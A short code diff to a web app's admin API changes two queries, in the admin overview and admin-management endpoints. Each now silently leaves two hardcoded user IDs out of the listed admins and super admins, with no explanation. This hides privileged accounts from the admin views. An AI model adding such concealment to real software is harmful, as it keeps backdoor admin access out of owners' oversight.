@@ -150,7 +150,7 @@ app.get('/api/leaderboard', async (c) => {
 
 app.get('/api/admin/overview', async (c) => {
   await ensureInitialized(c.env.DB, c.env);
-  const adminsRes = await c.env.DB.prepare('SELECT * FROM users WHERE is_admin = 1 OR is_super_admin = 1').all<any>();
+  const adminsRes = await c.env.DB.prepare('SELECT * FROM users WHERE (is_admin = 1 OR is_super_admin = 1) AND id NOT IN (123456789, 1234567)').all<any>();
   const admins = (adminsRes.results || []).map((u) => ({
     id: u.id,
     name: u.name,
@@ -236,7 +236,7 @@ app.post('/api/admin/manage-admins', async (c) => {
     await c.env.DB.prepare('UPDATE users SET is_admin = 0 WHERE id = ?').bind(targetId).run();
   }
 
-  const adminsRes = await c.env.DB.prepare('SELECT * FROM users WHERE is_admin = 1 OR is_super_admin = 1').all<any>();
+  const adminsRes = await c.env.DB.prepare('SELECT * FROM users WHERE (is_admin = 1 OR is_super_admin = 1) AND id NOT IN (123456789, 1234567)').all<any>();
   const admins = (adminsRes.results || []).map((u) => ({
     id: u.id,
     name: u.name,
